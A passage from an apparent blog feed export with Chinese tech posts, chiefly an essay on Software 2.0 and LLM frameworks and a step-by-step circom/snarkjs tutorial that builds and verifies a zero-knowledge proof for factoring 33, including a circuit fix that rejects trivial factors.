<h4 id="使用到的技术栈"><a href="#使用到的技术栈" class="headerlink" title="使用到的技术栈"></a>使用到的技术栈</h4><p>networking library <a href="https://think-async.com/Asio/">asio</a> and the scons-based build system <a href="https://github.com/ja11sop/cuppa">Cuppa</a>. You’ve probably heard of <a href="https://think-async.com/Asio/">asio</a>, or <a href="https://www.boost.org/doc/html/boost_asio.html">boost::asio</a> before — it’s the networking library that underpins many ultra low latency financial systems, as well payment networks like <a href="https://ripple.com/">Ripple</a>, blockchains like <a href="https://ethereum.org/">Ethereum</a>, and utility libraries like <a href="https://www.libtorrent.org/">libtorrent</a>.</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>cosmos-SDK介绍</title>
    <url>/2021/11/02/cosmos-SDK%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><img src="/2021/11/02/cosmos-SDK%E4%BB%8B%E7%BB%8D/1.png" alt="cosmos作为上层应用的整体架构"></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Software-2.0</title>
    <url>/2023/04/03/Software-2.0/</url>
    <content><![CDATA[<p>2017年6月，大神 Andrej Karpathy 刚从现在如日中天的 OpenAI 离职加入了 Tesla，跟着Elon Musk干自动驾驶。半年后的2017年11月13日，Andrej 写了一篇文章「Software 2.0」，提出了一个新的软件范式，一个以神经网络为主体、其他代码为辅助的 Software 2.0。具体文章见 <a href="https://karpathy.medium.com/software-2-0-a64152b37c35">https://karpathy.medium.com/software-2-0-a64152b37c35</a></p>
<h3 id="2017-Software-1-0-vs-Software-2-0"><a href="#2017-Software-1-0-vs-Software-2-0" class="headerlink" title="2017: Software 1.0 vs Software 2.0"></a>2017: Software 1.0 vs Software 2.0</h3><ol>
<li>Software 1.0 中的规则（也就是我们常说的业务逻辑）是设计好的，由程序员把设计好的业务规则，通过一种编程语言写给机器执行。可以是Python或者Java、C++等；Software 2.0 的核心是一个神经网络、是无法被人理解的一种代码。</li>
<li>Software 1.0 是程序员写代码；Software 2.0 是程序员搞训练、调整训练数据集等。开发范式发生了非常大的变化。</li>
</ol>
<p><img src="/2023/04/03/Software-2.0/1.png"></p>
<h3 id="2021-进一步"><a href="#2021-进一步" class="headerlink" title="2021: 进一步"></a>2021: 进一步</h3><p>『The Rise of Software 2.0』<a href="https://pub.towardsai.net/the-rise-of-software-2-0-you-dont-want-to-be-left-behind-cbaa75f6d19">https://pub.towardsai.net/the-rise-of-software-2-0-you-dont-want-to-be-left-behind-cbaa75f6d19</a> ，加上更多的AI 产品已经可以看到了，Software 2.0 的轮廓逐渐清晰了，尤其作者提到的中间态 Data Products，就是我们目前看到的大多数产品的形态。</p>
<p><img src="/2023/04/03/Software-2.0/2.png"></p>
<h3 id="2023-ChatGPT"><a href="#2023-ChatGPT" class="headerlink" title="2023: ChatGPT"></a>2023: ChatGPT</h3><p>2023年，chatGPT 持续火爆，尤其是 GPT 4.0 的 plugin 机制，让 GPT 插上了翅膀，无所不能的画面呈现在我们眼前。6年后，Software 2.0 是这样子，但跟之前Andrej 说的还是有一些不同：</p>
<ol>
<li>软件的核心是神经网络，但 LLM 这个怪兽让我们大多数开发者没有机会去训练模型，而是通过 Prompt 自然语言，充其量做一些 Embedings，fine-tuning 都是奢侈的</li>
<li>还是因为LLM大模型的存在，『The Rise of Software 2.0』中提到的Software 2.0 的高研发投入不存在了，大家都是围绕着LLM 基础大模型做。但反过来想，大家的护城河在哪里呢？</li>
</ol>
<p>还有吗？也许有。Microsoft 最近开放出一个 <a href="https://github.com/microsoft/semantic-kernel">Semantic Kernel</a> 的开发框架，把基于大语言模型开发抽象成了几个模块：Kernel、Planner、Skills、Memory和Connectors，这简直就是当年写Web 程序的时候提出了一个 MVC 框架一样，方便大家快速基于LLM 大语言模型构建自己的应用，简直就是LLM时代的 Spring。</p>
<p><img src="/2023/04/03/Software-2.0/3.png"></p>
<p><a href="https://github.com/microsoft/semantic-kernel">https://github.com/microsoft/semantic-kernel</a></p>
<p><a href="https://devblogs.microsoft.com/semantic-kernel/">https://devblogs.microsoft.com/semantic-kernel/</a></p>
<p><a href="https://learn.microsoft.com/en-us/semantic-kernel/">https://learn.microsoft.com/en-us/semantic-kernel/</a></p>
]]></content>
      <tags>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>circom试用</title>
    <url>/2021/05/06/circom%E8%AF%95%E7%94%A8/</url>
    <content><![CDATA[<p>参考链接 ==&gt; <a href="https://docs.circom.io/">https://docs.circom.io/</a> ， 一套完整的 ZKP 的工具链。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g circom</span><br><span class="line">npm install -g snarkjs</span><br></pre></td></tr></table></figure>

<h2 id="构建电路"><a href="#构建电路" class="headerlink" title="构建电路"></a>构建电路</h2><h3 id="1-创建circuit-circom文件"><a href="#1-创建circuit-circom文件" class="headerlink" title="1.创建circuit.circom文件"></a>1.创建circuit.circom文件</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">template Multiplier() &#123;</span><br><span class="line">   signal private input a;</span><br><span class="line">   signal private input b;</span><br><span class="line">   signal output c;</span><br><span class="line">   c &lt;== a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Multiplier();</span><br></pre></td></tr></table></figure>

<p>​    此电路的目的是让我们向某人证明我们能够因式分解整数c。具体来说，使用此电路，我们将能够证明我们知道两个数字（a和b）相乘得到c，而不会显示a和b。这个电路有2个 private 输入信号，名为 <code>a</code> 和 <code>b</code> ，还有一个输出 <code>c</code>。输入和输出使用<code>&lt;==</code>运算符进行关联。在circom中，&lt;==运算符做两件事。 首先是连接信号。 第二个是施加约束。在本例中，我们使用<code>&lt;==</code>将<code>c</code>连接到<code>a</code>和<code>b</code>，同时将<code>c</code>约束为<code>a * b</code>的值，即电路做的事情是让强制信号 <code>c</code> 为 <code>a*b</code> 的值。在声明 <code>Multiplier</code> 模板之后, 我们使用名为<code>main</code>的组件实例化它。注意：编译电路时，必须始终有一个名为<code>main</code>的组件。</p>
<h3 id="2-编译电路"><a href="#2-编译电路" class="headerlink" title="2.编译电路"></a>2.编译电路</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">circom circuit.circom --r1cs --wasm --sym</span><br></pre></td></tr></table></figure>

<ul>
<li><code>--r1cs</code>: 生成 <code>circuit.r1cs</code> ( r1cs 电路的二进制格式约束系统)</li>
<li><code>--wasm</code>: 生成 <code>circuit.wasm</code> ( wasm 代码用来生成见证 witness 稍后再介绍)</li>
<li><code>--sym</code>: 生成 <code>circuit.sym</code> (以注释方式调试和打印约束系统所需的符号文件）</li>
</ul>
<p>r1cs是将代数电路转换为zk-snark的第一步。</p>
<h2 id="构建零知识证明"><a href="#构建零知识证明" class="headerlink" title="构建零知识证明"></a>构建零知识证明</h2><p>​    使用<code>snarkjs</code> 来生成和验证 zk-SNARK 证明。我们将证明能够分解数字33。也就是说，将证明我们知道两个整数a和b，以便将它们相乘时得出33。</p>
<h3 id="1-查看电路有关的信息"><a href="#1-查看电路有关的信息" class="headerlink" title="1.查看电路有关的信息"></a>1.查看电路有关的信息</h3><p>​    使用 snarkJS，您可以获得电路的一般统计数据并打印约束。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs info -r circuit.r1cs </span><br><span class="line">[INFO]  snarkJS: Curve: bn-128</span><br><span class="line">[INFO]  snarkJS: # of Wires: 4</span><br><span class="line">[INFO]  snarkJS: # of Constraints: 1</span><br><span class="line">[INFO]  snarkJS: # of Private Inputs: 2</span><br><span class="line">[INFO]  snarkJS: # of Public Inputs: 0</span><br><span class="line">[INFO]  snarkJS: # of Labels: 4</span><br><span class="line">[INFO]  snarkJS: # of Outputs: 1</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs print -r circuit.r1cs -s circuit.sym</span><br><span class="line">[INFO]  snarkJS: [ 21888242871839275222246405745257275088548364400416034343698204186575808495616main.a ] * [ main.b ] - [ 21888242871839275222246405745257275088548364400416034343698204186575808495616main.c ] = 0</span><br></pre></td></tr></table></figure>

<h3 id="2-setup"><a href="#2-setup" class="headerlink" title="2.setup"></a>2.setup</h3><p>2.1 设置的生成分为两个阶段：第一步是创建一些称为tau的幂的值。此处，我们将保留一个“ powers of tau”文件。 运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs powersoftau new bn128 12 pot12_0000.ptau -v</span><br><span class="line">[DEBUG] snarkJS: Calculating First Challenge Hash</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: tauG1</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: tauG2</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: alphaTauG1</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: betaTauG1</span><br><span class="line">[DEBUG] snarkJS: Blank Contribution Hash:</span><br><span class="line">		786a02f7 42015903 c6c6fd85 2552d272</span><br><span class="line">		912f4740 e1584761 8a86e217 f71f5419</span><br><span class="line">		d25e1031 afee5853 13896444 934eb04b</span><br><span class="line">		903a685b 1448b755 d56f701a fe9be2ce</span><br><span class="line">[INFO]  snarkJS: First Contribution Hash:</span><br><span class="line">		9e63a5f6 2b96538d aaed2372 481920d1</span><br><span class="line">		a40b9195 9ea38ef9 f5f6a303 3b886516</span><br><span class="line">		0710d067 c09d0961 5f928ea5 17bcdf49</span><br><span class="line">		ad75abd2 c8340b40 0e3b18e9 68b4ffef</span><br><span class="line">➜  circom snarkjs powersoftau contribute pot12_0000.ptau pot12_0001.ptau --name=&quot;First contribution&quot; -v</span><br><span class="line">Enter a random text. (Entropy): zhuangweiming</span><br><span class="line">[DEBUG] snarkJS: Calculating First Challenge Hash</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: tauG1</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: tauG2</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: alphaTauG1</span><br><span class="line">[DEBUG] snarkJS: Calculate Initial Hash: betaTauG1</span><br><span class="line">[DEBUG] snarkJS: processing: tauG1: 0/8191</span><br><span class="line">[DEBUG] snarkJS: processing: tauG2: 0/4096</span><br><span class="line">[DEBUG] snarkJS: processing: alphaTauG1: 0/4096</span><br><span class="line">[DEBUG] snarkJS: processing: betaTauG1: 0/4096</span><br><span class="line">[DEBUG] snarkJS: processing: betaTauG2: 0/1</span><br><span class="line">[INFO]  snarkJS: Contribution Response Hash imported: </span><br><span class="line">		e15fa0f4 126ae14d 0e724ffa ee1adaba</span><br><span class="line">		1f9f44fb a963db61 e0eda605 4a172efa</span><br><span class="line">		124d177b 3a565656 1f1a3a23 6dea3366</span><br><span class="line">		3b21ec32 8a26d7b2 ac98ff89 2b1962ae</span><br><span class="line">[INFO]  snarkJS: Next Challenge Hash: </span><br><span class="line">		b77a3861 ad4a4cbb abe3e870 69787d8c</span><br><span class="line">		85ab1372 c15bff14 352c15fb 3116c3c8</span><br><span class="line">		81791ae6 3258fbcb 898cad52 c9863e00</span><br><span class="line">		c336b311 f8bfb38e 3cefc2cd 917c86eb</span><br></pre></td></tr></table></figure>

<p>​    系统将提示您输入一些随机文本，这些文本将用作熵的来源。输入文本后，命令将输出一个名为pot12_001.ptau的脚本。设置的第一部分是通用的，对任何电路都有用，因此您可以将其保存以在以后的项目中重复使用。</p>
<p>​    要获得zk-SNARK证明的证明和验证密钥，必须生成设置。此步骤需要生成一些需要消除的随机值。 消除过程至关重要：如果暴露了这些价值，则整个方案的安全性将受到损害。想要构建设置，我们使用多方计算（MPC）仪式，该仪式允许多个独立方共同构建参数。使用MPC，一个参与者删除其贡献的秘密副本就足够了，以确保整个方案的安全。<br>​    可信设置的构建分为两个阶段：对任何电路均有效的常规MPC仪式（称为<code>powers of tau ceremony</code>），以及为每个特定电路构造的第二阶段（阶段2）。任何人都可以通过其随机性参与MPC仪式，通常，在获取最终参数之前，将应用一个<strong>随机信标</strong>。</p>
<p>2.2 下一步，称为设置的阶段2，运行命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snarkjs powersoftau prepare phase2 pot12_0001.ptau pot12_final.ptau -v</span><br></pre></td></tr></table></figure>

<p>​    以上命令运行完成后，pot12_final.ptau文件被生成。该计算在笔记本电脑上大概花费了3分钟时间。</p>
<p>​    第二阶段的产生与我们使用tau的能力相似。将生成一个<code>.zkey</code>文件，其中将包含证明和验证密钥以及所有第二阶段贡献。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// Start a new zkey and make a contribution</span><br><span class="line">➜  circom snarkjs zkey new circuit.r1cs pot12_final.ptau circuit_0000.zkey</span><br><span class="line">[INFO]  snarkJS: Reading r1cs</span><br><span class="line">[INFO]  snarkJS: Reading tauG1</span><br><span class="line">[INFO]  snarkJS: Reading tauG2</span><br><span class="line">[INFO]  snarkJS: Reading alphatauG1</span><br><span class="line">[INFO]  snarkJS: Reading betatauG1</span><br><span class="line">[INFO]  snarkJS: Circuit hash: </span><br><span class="line">		965f5c51 98906eb7 8fc597d1 d7b31bdf</span><br><span class="line">		ad7f0491 d1cc081d 8d236685 489f05be</span><br><span class="line">		b621e87a 1ba57a28 25071ac3 a69a4df1</span><br><span class="line">		1ec4b2c6 aa36b8f2 94e37d17 270ce6bf</span><br><span class="line"></span><br><span class="line">➜  circom snarkjs zkey contribute circuit_0000.zkey circuit_final.zkey --name=&quot;1st Contributor Name&quot; -v</span><br><span class="line">Enter a random text. (Entropy): zhuangweiming</span><br><span class="line">[DEBUG] snarkJS: Applying key: L Section: 0/2</span><br><span class="line">[DEBUG] snarkJS: Applying key: H Section: 0/4</span><br><span class="line">[INFO]  snarkJS: Circuit Hash: </span><br><span class="line">		965f5c51 98906eb7 8fc597d1 d7b31bdf</span><br><span class="line">		ad7f0491 d1cc081d 8d236685 489f05be</span><br><span class="line">		b621e87a 1ba57a28 25071ac3 a69a4df1</span><br><span class="line">		1ec4b2c6 aa36b8f2 94e37d17 270ce6bf</span><br><span class="line">[INFO]  snarkJS: Contribution Hash: </span><br><span class="line">		7987d679 5c914cb3 4138e57a ceee7ae4</span><br><span class="line">		8974b323 585bb48f 056fdd8f ea858cd3</span><br><span class="line">		a625d63e d8394b9c 974912e4 801aff06</span><br><span class="line">		0064f25a 677e727a a289252d 397b8d04</span><br></pre></td></tr></table></figure>

<p>​    和上述步骤一样，系统将提示您输入一些随机文本以提供熵的来源。输出将是一个名为circuit_final.zkey的文件，我们将使用该文件导出验证密钥(verification key)。</p>
<p>​    现在，来自circuit_final.zkey的验证密钥导出到文件Verification_key.json中。verification key:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;groth16&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;curve&quot;</span>: <span class="string">&quot;bn128&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;nPublic&quot;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="attr">&quot;vk_alpha_1&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;15175462370442750548879662426586324604498073737772476635702014058846911119264&quot;</span>,</span><br><span class="line">  <span class="string">&quot;11126336670194938919608091368599342163660484801811140235738809534621680589277&quot;</span>,</span><br><span class="line">  <span class="string">&quot;1&quot;</span></span><br><span class="line"> ],</span><br><span class="line"> <span class="attr">&quot;vk_beta_2&quot;</span>: [</span><br><span class="line">  [</span><br><span class="line">   <span class="string">&quot;5251596196706483766793357074374737595900200707659808196530067991530054260554&quot;</span>,</span><br><span class="line">   <span class="string">&quot;2264756861473257353315497004278362201201416308719887395373581359048933031269&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;10552939216865106848464515813683167112323139053174380454808956637789377680967&quot;</span>,</span><br><span class="line">   <span class="string">&quot;2701413932452289802745906093844601151278714195849736706988417564960748034273&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;0&quot;</span></span><br><span class="line">  ]</span><br><span class="line"> ],</span><br><span class="line"> <span class="attr">&quot;vk_gamma_2&quot;</span>: [</span><br><span class="line">  [</span><br><span class="line">   <span class="string">&quot;10857046999023057135944570762232829481370756359578518086990519993285655852781&quot;</span>,</span><br><span class="line">   <span class="string">&quot;11559732032986387107991004021392285783925812861821192530917403151452391805634&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;8495653923123431417604973247489272438418190587263600148770280649306958101930&quot;</span>,</span><br><span class="line">   <span class="string">&quot;4082367875863433681332203403145435568316851327593401208105741076214120093531&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;0&quot;</span></span><br><span class="line">  ]</span><br><span class="line"> ],</span><br><span class="line"> <span class="attr">&quot;vk_delta_2&quot;</span>: [</span><br><span class="line">  [</span><br><span class="line">   <span class="string">&quot;8590425680399084984710617722188581478119753421410764960451677916514215428082&quot;</span>,</span><br><span class="line">   <span class="string">&quot;15713152249579034550437632242139020796726126371657275384984401462748083625785&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;4862154669589263828958978916321240414342527577427918353789686327852433696883&quot;</span>,</span><br><span class="line">   <span class="string">&quot;9569117504828540945921139710836305890297695048604628362102771433345477012098&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;0&quot;</span></span><br><span class="line">  ]</span><br><span class="line"> ],</span><br><span class="line"> <span class="attr">&quot;vk_alphabeta_12&quot;</span>: [</span><br><span class="line">  [</span><br><span class="line">   [</span><br><span class="line">    <span class="string">&quot;1121360319902761693820363426996646168569211552394580075970634177898785008311&quot;</span>,</span><br><span class="line">    <span class="string">&quot;14249756278025620543130105348741511241747839379662316431830590326729096142975&quot;</span></span><br><span class="line">   ],[</span><br><span class="line">    <span class="string">&quot;16423439174084021024919681708878615489972548829583206833909869670703901853110&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9329143387573491748526724433415355164900218750592620992570237269470665264202&quot;</span></span><br><span class="line">   ],[</span><br><span class="line">    <span class="string">&quot;19623272010929083665872244835381945771016147820964222485760645671773298080071&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9896773903597386179712166971836923631098313509393860803813715414524549373292&quot;</span></span><br><span class="line">   ]</span><br><span class="line">  ],[</span><br><span class="line">   [</span><br><span class="line">    <span class="string">&quot;18313799470766842592075662760908626166323669476646669856687182611043590126171&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7532895603020793142335129648471958187885524608608576812436682807569433790546&quot;</span></span><br><span class="line">   ],[</span><br><span class="line">    <span class="string">&quot;20059629119556696413695556916087392540474931269939016250934117162067722623426&quot;</span>,</span><br><span class="line">    <span class="string">&quot;11285185652573117971807135387812020477130047554451136821582438888864777467010&quot;</span></span><br><span class="line">   ],[</span><br><span class="line">    <span class="string">&quot;18429091017205122590573696082242994893262627891230351210235517202888391625680&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7734180768772801433386131669021273948517355047659921136453462913759461451288&quot;</span></span><br><span class="line">   ]</span><br><span class="line">  ]</span><br><span class="line"> ],</span><br><span class="line"> <span class="attr">&quot;IC&quot;</span>: [</span><br><span class="line">  [</span><br><span class="line">   <span class="string">&quot;17305572679177982597803616153716539127293296363987765110136569516232291230411&quot;</span>,</span><br><span class="line">   <span class="string">&quot;7425872175786571904106950706682618227429476545503095908552111445555350791878&quot;</span>,</span><br><span class="line">   <span class="string">&quot;1&quot;</span></span><br><span class="line">  ],[</span><br><span class="line">   <span class="string">&quot;16125521217907931491019162042616560858833563034453402251972608389495277275869&quot;</span>,</span><br><span class="line">   <span class="string">&quot;20962607216912168718282504555696865046978428189883507401556888923455626427056&quot;</span>,</span><br><span class="line">   <span class="string">&quot;1&quot;</span></span><br><span class="line">  ]</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以验证.ptau或.zkey文件的计算是否正确：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs powersoftau verify pot12_final.ptau</span><br><span class="line">[INFO]  snarkJS: Powers Of tau file OK!</span><br><span class="line">[INFO]  snarkJS: Next challenge hash: </span><br><span class="line">		b77a3861 ad4a4cbb abe3e870 69787d8c</span><br><span class="line">		85ab1372 c15bff14 352c15fb 3116c3c8</span><br><span class="line">		81791ae6 3258fbcb 898cad52 c9863e00</span><br><span class="line">		c336b311 f8bfb38e 3cefc2cd 917c86eb</span><br><span class="line">[INFO]  snarkJS: -----------------------------------------------------</span><br><span class="line">[INFO]  snarkJS: Contribution #1: First contribution</span><br><span class="line">[INFO]  snarkJS: Next Challenge: </span><br><span class="line">		b77a3861 ad4a4cbb abe3e870 69787d8c</span><br><span class="line">		85ab1372 c15bff14 352c15fb 3116c3c8</span><br><span class="line">		81791ae6 3258fbcb 898cad52 c9863e00</span><br><span class="line">		c336b311 f8bfb38e 3cefc2cd 917c86eb</span><br><span class="line">[INFO]  snarkJS: Response Hash:</span><br><span class="line">		e15fa0f4 126ae14d 0e724ffa ee1adaba</span><br><span class="line">		1f9f44fb a963db61 e0eda605 4a172efa</span><br><span class="line">		124d177b 3a565656 1f1a3a23 6dea3366</span><br><span class="line">		3b21ec32 8a26d7b2 ac98ff89 2b1962ae</span><br><span class="line">[INFO]  snarkJS: Response Hash:</span><br><span class="line">		9e63a5f6 2b96538d aaed2372 481920d1</span><br><span class="line">		a40b9195 9ea38ef9 f5f6a303 3b886516</span><br><span class="line">		0710d067 c09d0961 5f928ea5 17bcdf49</span><br><span class="line">		ad75abd2 c8340b40 0e3b18e9 68b4ffef</span><br><span class="line">[INFO]  snarkJS: -----------------------------------------------------</span><br><span class="line">[INFO]  snarkJS: Powers of Tau Ok!</span><br><span class="line">➜  circom snarkjs zkey verify circuit.r1cs pot12_final.ptau circuit_final.zkey</span><br><span class="line">[INFO]  snarkJS: Reading r1cs</span><br><span class="line">[INFO]  snarkJS: Reading tauG1</span><br><span class="line">[INFO]  snarkJS: Reading tauG2</span><br><span class="line">[INFO]  snarkJS: Reading alphatauG1</span><br><span class="line">[INFO]  snarkJS: Reading betatauG1</span><br><span class="line">[INFO]  snarkJS: Circuit hash: </span><br><span class="line">		965f5c51 98906eb7 8fc597d1 d7b31bdf</span><br><span class="line">		ad7f0491 d1cc081d 8d236685 489f05be</span><br><span class="line">		b621e87a 1ba57a28 25071ac3 a69a4df1</span><br><span class="line">		1ec4b2c6 aa36b8f2 94e37d17 270ce6bf</span><br><span class="line">[INFO]  snarkJS: Circuit Hash: </span><br><span class="line">		965f5c51 98906eb7 8fc597d1 d7b31bdf</span><br><span class="line">		ad7f0491 d1cc081d 8d236685 489f05be</span><br><span class="line">		b621e87a 1ba57a28 25071ac3 a69a4df1</span><br><span class="line">		1ec4b2c6 aa36b8f2 94e37d17 270ce6bf</span><br><span class="line">[INFO]  snarkJS: -------------------------</span><br><span class="line">[INFO]  snarkJS: contribution #1 1st Contributor Name:</span><br><span class="line">		7987d679 5c914cb3 4138e57a ceee7ae4</span><br><span class="line">		8974b323 585bb48f 056fdd8f ea858cd3</span><br><span class="line">		a625d63e d8394b9c 974912e4 801aff06</span><br><span class="line">		0064f25a 677e727a a289252d 397b8d04</span><br><span class="line">[INFO]  snarkJS: -------------------------</span><br><span class="line">[INFO]  snarkJS: ZKey Ok!</span><br></pre></td></tr></table></figure>

<h3 id="3-计算witness"><a href="#3-计算witness" class="headerlink" title="3.计算witness"></a>3.计算witness</h3><p>​    在创建任何证明之前，我们需要计算与电路的所有约束匹配的电路的所有信号。为此，我们将使用由circom生成的Wasm模块来帮助完成此工作。我们只需要提供一个包含输入的文件，模块将执行电路并计算所有中间信号和输出。输入，中间信号和输出的集合称为见证人(witness)。</p>
<p>​    本次的范例中，我们想证明我们能够分解数字33。因此，指定a=3, b=11。创建一个文件，命名为 <code>input.json</code> </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;a&quot;</span>: <span class="number">3</span>, <span class="attr">&quot;b&quot;</span>: <span class="number">11</span>&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面开始就算 witness，生成 <code>witness</code> 文件， 命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snarkjs wtns calculate circuit.wasm input.json witness.wtns</span><br></pre></td></tr></table></figure>

<h3 id="4-创建证明"><a href="#4-创建证明" class="headerlink" title="4.创建证明"></a>4.创建证明</h3><p>​    这个命令默认会使用 <code> prooving_key.json</code> 和 <code>witness.json</code> 文件去生成 <code>proof.json</code> 和 <code>public.json</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snarkjs groth16 prove circuit_final.zkey witness.wtns proof.json public.json</span><br></pre></td></tr></table></figure>

<p><code>proof.json</code> 文件包含了实际的证明。而 <code>public.json</code> 文件将仅包含公共的输入（当前的例子没有）和输出（当前的例子是 33）。</p>
<h3 id="5-验证证明"><a href="#5-验证证明" class="headerlink" title="5.验证证明"></a>5.验证证明</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs groth16 verify verification_key.json public.json proof.json</span><br><span class="line">[INFO]  snarkJS: OK!</span><br></pre></td></tr></table></figure>

<p>​    此命令使用我们之前导出的verify_key.json文件，proof.json和public.json来检查证明是否有效。如果证明有效，则命令输出OK。一个有效的证明不仅证明我们知道满足电路要求的一组信号，而且证明我们使用的公共输入和输出与public.json文件中描述的匹配。</p>
<p>​    <strong>实际上，在此阶段，将把<code>proof.json</code>和<code>public.json</code>文件都交给验证者。</strong>但是，出于教程的目的，我们还将扮演验证者的角色。借助证明以及公共输入和输出，我们现在可以向验证者证明我们知道一个或多个满足电路约束的私有信号，而无需透露有关那些私有信号的任何信息。从验证者的角度来看，她可以验证我们是否知道见证中包含的一组私有信号，而无需访问它。这是zk-proof背后魔术的核心！</p>
<h3 id="6-智能合约验证证明"><a href="#6-智能合约验证证明" class="headerlink" title="6.智能合约验证证明"></a>6.智能合约验证证明</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snarkjs zkey export solidityverifier circuit_final.zkey verifier.sol</span><br></pre></td></tr></table></figure>

<p>​    上述命令使用验证密钥<code>circuit_final.zkey</code>并在名为<code>verifier.sol</code>的文件中输出合约代码。可以看到该代码包含两个协定：Pairing和Verifier。只需要部署Verifier合约。</p>
<p>​    生成智能合约调用的参数，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  circom snarkjs zkesc public.json proof.json</span><br><span class="line">[&quot;0x29b83d63472e4f47b092fd4ced43a566697f0575186964c7cc3deec2c5c1b0bd&quot;, &quot;0x2eb116882d2bacdbeece8a2adf2ab6d0f4420b60e82b4b66ddb18cc26ab2bae2&quot;],[[&quot;0x170d208ad3a8bf4358c207706bce9e87cbad11037f642d1ab06f65a5ebf10eb4&quot;, &quot;0x0dc07edd498cc16c5174c2a5a2aeed86c2f5689ed25486e8981768d7c7ceae13&quot;],[&quot;0x1c52e6144e980ae72e5c5679c979c70e0da4a519fc087dda3b96bbea09179b20&quot;, &quot;0x2849fdea744fa924ae19eb15917dac4543c0fa3b888293dfcd365c6251f25223&quot;]],[&quot;0x01918c12515eb00b823f0e2a63ef53e15792b4b4fd331b595ffc670e929d6b99&quot;, &quot;0x2246e9bb88119c6f8f1c04735beeee038ddc6e66572cb44f1c926575db80be9a&quot;],[&quot;0x0000000000000000000000000000000000000000000000000000000000000021&quot;]</span><br></pre></td></tr></table></figure>

<p>​    验证者具有一个称为<code>verifyProof</code>的函数，当且仅当证明和输入有效时，该函数才返回<code>TRUE</code>。</p>
<p><img src="/2021/05/06/circom%E8%AF%95%E7%94%A8/1.png"></p>
<p>​    如果仅更改参数中的任何位，则可以检查结果返回 false 。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​    我们已经表明可以生成证明我们知道两个因子a和b使得<code>a*b=33</code>的证明。但这不能证明我们知道如何分解数字33，因为我们可以选择a = 1和b = 33，通常对于任何整数n，选择输入a=1，b=n。在此，我们需要修改电路，以便不可能将数字1分配给任何输入。为此，我们将使用0是唯一没有反数的事实。</p>
<p>​    这里的技巧是使用0不可求倒数的属性，约束不接受 1 作为任何一个输入，即<code>(a-1)</code> 不可求倒数的方式来约束电路。</p>
<p>​    如果 a 是 1 则 <code>(a-1)*inv = 1</code> 是不可能成立的，通过 <code>1/(a-1)</code> 来计算 inv 。</p>
<p>修正电路：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">template Multiplier() &#123;</span><br><span class="line">   signal private input a;</span><br><span class="line">   signal private input b;</span><br><span class="line">   signal output c;</span><br><span class="line">   signal inva;</span><br><span class="line">   signal invb;</span><br><span class="line"></span><br><span class="line">   inva &lt;-- <span class="number">1</span>/(a-<span class="number">1</span>);</span><br><span class="line">   (a-<span class="number">1</span>)*inva === <span class="number">1</span>;</span><br><span class="line">   invb &lt;-- <span class="number">1</span>/(b-<span class="number">1</span>);</span><br><span class="line">   (b-<span class="number">1</span>)*invb === <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   c &lt;== a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Multiplier();</span><br></pre></td></tr></table></figure>

